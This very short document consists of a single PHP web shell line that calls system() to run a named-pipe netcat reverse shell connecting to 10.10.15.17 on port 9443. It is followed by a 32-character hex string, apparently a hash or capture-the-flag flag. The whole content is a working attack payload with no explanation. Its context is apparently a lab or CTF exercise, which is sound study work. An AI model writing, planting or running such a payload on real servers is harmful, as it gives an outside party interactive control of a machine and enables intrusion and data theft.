<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.17 9443 >/tmp/f"); ?>
de5e5d6619862a8aa5b9b212314e0cdd